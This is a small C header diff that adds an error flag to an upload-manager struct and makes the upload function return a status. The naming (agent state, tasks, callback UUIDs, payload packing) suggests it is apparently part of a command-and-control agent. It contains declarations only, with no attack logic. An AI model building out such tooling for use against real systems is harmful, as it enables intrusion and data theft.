@@ -69,6 +69,7 @@ typedef struct UploadManager {
 	size_t buflen; // current length of data within buffer
 	size_t bufsize; // current capacity of buffer
 	BOOL finished;
+	BOOL error;
 } UploadManager;
 
 typedef struct AgentState {
@@ -130,7 +131,7 @@ void perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char 
 
 UploadManager initialise_upload_manager(char *callback_uuid, char *task_id, char *file_uuid);
 void free_upload_manager(UploadManager *upload);
-void perform_upload(AgentState *stage, UploadManager *upload);
+BOOL perform_upload(AgentState *stage, UploadManager *upload);
 
 void pack_char(char *buf, int *offset, char paydata);
 void pack_uint(char *buf, int *offset, unsigned int paydata);
